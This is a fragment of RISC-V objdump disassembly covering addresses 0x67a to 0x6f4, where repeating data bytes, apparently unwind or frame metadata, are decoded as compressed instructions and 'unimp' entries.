 67a:	0000                	unimp
 67c:	0000                	unimp
 67e:	0000                	unimp
 680:	0e42                	slli	t3,t3,0x10
 682:	4230                	lw	a2,64(a2)
 684:	0288                	addi	a0,sp,320
 686:	0c42                	slli	s8,s8,0x10
 688:	0008                	0x8
 68a:	6602                	ld	a2,0(sp)
 68c:	0cc8                	addi	a0,sp,596
 68e:	3002                	fld	ft0,32(sp)
 690:	0e42                	slli	t3,t3,0x10
 692:	0000                	unimp
 694:	0000                	unimp
 696:	0000                	unimp
 698:	002c                	addi	a1,sp,8
 69a:	0000                	unimp
 69c:	00c0                	addi	s0,sp,68
 69e:	0000                	unimp
 6a0:	25f8                	fld	fa4,200(a1)
 6a2:	8000                	0x8000
 6a4:	0000                	unimp
 6a6:	0000                	unimp
 6a8:	004a                	c.slli	zero,0x12
 6aa:	0000                	unimp
 6ac:	0000                	unimp
 6ae:	0000                	unimp
 6b0:	0e42                	slli	t3,t3,0x10
 6b2:	4230                	lw	a2,64(a2)
 6b4:	0288                	addi	a0,sp,320
 6b6:	0c42                	slli	s8,s8,0x10
 6b8:	0008                	0x8
 6ba:	4002                	0x4002
 6bc:	0cc8                	addi	a0,sp,596
 6be:	3002                	fld	ft0,32(sp)
 6c0:	0e42                	slli	t3,t3,0x10
 6c2:	0000                	unimp
 6c4:	0000                	unimp
 6c6:	0000                	unimp
 6c8:	002c                	addi	a1,sp,8
 6ca:	0000                	unimp
 6cc:	00c0                	addi	s0,sp,68
 6ce:	0000                	unimp
 6d0:	2642                	fld	fa2,16(sp)
 6d2:	8000                	0x8000
 6d4:	0000                	unimp
 6d6:	0000                	unimp
 6d8:	00dc                	addi	a5,sp,68
 6da:	0000                	unimp
 6dc:	0000                	unimp
 6de:	0000                	unimp
 6e0:	0e42                	slli	t3,t3,0x10
 6e2:	4230                	lw	a2,64(a2)
 6e4:	0288                	addi	a0,sp,320
 6e6:	0c42                	slli	s8,s8,0x10
 6e8:	0008                	0x8
 6ea:	d202                	sw	zero,36(sp)
 6ec:	0cc8                	addi	a0,sp,596
 6ee:	3002                	fld	ft0,32(sp)
 6f0:	0e42                	slli	t3,t3,0x10
 6f2:	0000                	unimp
 6f4:	0000                	unimp
	...
